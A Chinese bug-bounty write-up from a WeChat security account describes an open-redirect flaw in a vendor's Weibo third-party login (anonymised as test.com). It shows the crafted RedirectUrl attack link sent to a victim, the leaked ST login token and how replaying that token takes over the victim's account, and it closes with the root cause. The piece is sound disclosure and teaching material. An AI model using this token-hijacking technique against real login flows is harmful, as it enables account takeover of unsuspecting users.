---
title: 漏洞挖掘之众测厂商 第三方登录RedirectUrl劫持漏洞
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247494519&idx=1&sn=cd24e7e546ec5cd027e8ca018f499bf4&chksm=e8a5e114dfd268025b28a508644eff19bd5ccf522b270bc7a6e545a340e65e4eb88e83aef43e&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-05-06
fetch_date: 2025-10-06T17:15:47.289202
---

# 漏洞挖掘之众测厂商 第三方登录RedirectUrl劫持漏洞

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj61xszlel8t3d0bZeLicV8EENM4dN9icyMu6cBxRIW8NeQCYB7icfTHRlBrt8Z7NRq5QHKABZicQM7Gsg/0?wx_fmt=jpeg)

# 漏洞挖掘之众测厂商 第三方登录RedirectUrl劫持漏洞

p喵呜

迪哥讲事

# 0x00 前言

文章中的项目地址统一修改为: test.com 保护厂商也保护自己

# 0x01 前期准备

```
测试微博
测试微博账号：182******77
注：此微博已绑定厂商账号
```

```
测试厂商账号：182******77
注：测试微博绑定的就是此账号
```

# 0x02 攻击开始

官网: https://passport.test.com

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj61xszlel8t3d0bZeLicV8EEutld5maQFI7aG2HTXrYlmjl1dMn6fAEQkKjdgNGDH0KBGhzc8icn4DA/640?wx_fmt=png&from=appmsg)

攻击url: https://passport.test.com/Union/WeiBo?RedirectUrl=http://baidu.com

然后将此url发给受害者,受害者打开

劫持到的内容: https://www.baidu.com/?ST=NmQxZGU2ZjMtNDk3Ny00YzJhLWI2YjAtYTJjMWI2YWIyYTkx

![](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj61xszlel8t3d0bZeLicV8EEzOuG3MCLZkLRzrIcXr3Y8NZPLVpPu4Hia0jhOMaxeGcUvnlWDh9FX2A/640?wx_fmt=other&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj61xszlel8t3d0bZeLicV8EECpicjCTsJLGnwZ4nG2jMCoGLcW967bFEwicSqTKfJ7CbH4aHSPBfdDyw/640?wx_fmt=png&from=appmsg)

ST = 用户登录凭证,然后将此凭证拼接任意目标站点即可登录

换浏览器打开:http://my.test.com?ST=NmQxZGU2ZjMtNDk3Ny00YzJhLWI2YjAtYTJjMWI2YWIyYTkx

![](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj61xszlel8t3d0bZeLicV8EEGmBIPGgIH60TzfbjG5tjibrIMvdicrPrIwCQNs3qQeD4iaGtjksia5Wqmg/640?wx_fmt=other&from=appmsg)

成功登录此用户

看不懂的文末有彩蛋

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款
前面有同学问我有没优惠券，这里发放100张100元的优惠券,用完今年不再发放

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7N5nMaJbtnMPVw96ZcVbWfp6SGDicUaGZyrWOM67xP8Ot3ftyqOybMqbj1005WvMNbDJO0hOWkCaQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

## 往期回顾

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

有的人可能看不懂，其实这个漏洞逻辑也很简单，就是将RedirectUrl这个参数后面的url改为你自己的域名，只要受害者点击了RedirectUrl改变之后的url,你就可以在网站日志里面查看到相对应的token/code，攻击者就可以利用泄露的token/code实现账户劫持，原因主要在于开发者并未对RedirectUrl做严格的过滤

原文:https://www.yuque.com/pmiaowu/web\_security\_1/obtg20

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过